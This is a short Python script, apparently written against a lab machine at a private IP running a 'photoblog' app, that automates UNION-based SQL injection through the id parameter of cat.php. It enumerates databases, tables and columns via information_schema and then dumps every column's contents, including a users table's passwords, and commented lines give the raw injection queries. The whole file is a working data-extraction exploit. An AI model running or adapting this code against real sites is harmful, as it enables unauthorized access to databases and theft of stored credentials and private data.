import requests 

#r = requests.get("http://192.168.204.130/cat.php?id=1 union select 1,column_name,3,4 from information_schema.columns where table_name='pictures'")
#r = requests.get("http://192.168.204.130/cat.php?id=1 union select 1,table_name,3,4 from information_schema.tables where table_schema='photoblog'")
#r = requests.get("http://192.168.204.130/cat.php?id=1 union select 1,password,3,4 from photoblog.users")

def listarData(query):
    url = "http://192.168.204.130/cat.php?id="
    r = requests.get(url+query)
    data = r.text.split(' ')
    listDataConten = []

    for pos in data:
        if len(pos) >= 6:
            if pos[0:3] == "alt":
                namePos = pos.split('alt="')[1]
                if namePos != 'Ruby"' and namePos != 'Cthulhu"':
                    listDataConten.append(namePos.split('"')[0])
    return listDataConten

def listDataBase(nameSalida,nameType, whereConditon, condition):
    if whereConditon:
        query = "1 union select 1,"+nameSalida+",3,4 from " + nameType +' '+ condition
    else:
        query = "1 union select 1,"+nameSalida+",3,4 from " + nameType
    return listarData(query)
    

def contenidoBD():
    listNameOuput = ["schema_name","table_name","column_name"]
    listNameType = ["information_schema.schemata","information_schema.tables","information_schema.columns"]
    listNameDBs  = listDataBase(listNameOuput[0],listNameType[0],False,"")
    for namedb in listNameDBs:
        if namedb != 'information_schema':
            tablas = listDataBase(listNameOuput[1],listNameType[1],True,"where table_schema='"+namedb+"'")
            print('|'+namedb+'|')
            for tabla in tablas:
                columns = listDataBase(listNameOuput[2],listNameType[2],True,"where table_name='"+tabla+"' and table_schema='"+namedb+"'")
                print('Tabla Nombre: '+tabla)
                for column in columns:
                    contents = listDataBase(column,namedb+'.'+tabla,False,'')
                    print('Columns: '+column, end=' : ')
                    for content in contents:
                        print(content,end=',')
                    print()
                print()

contenidoBD()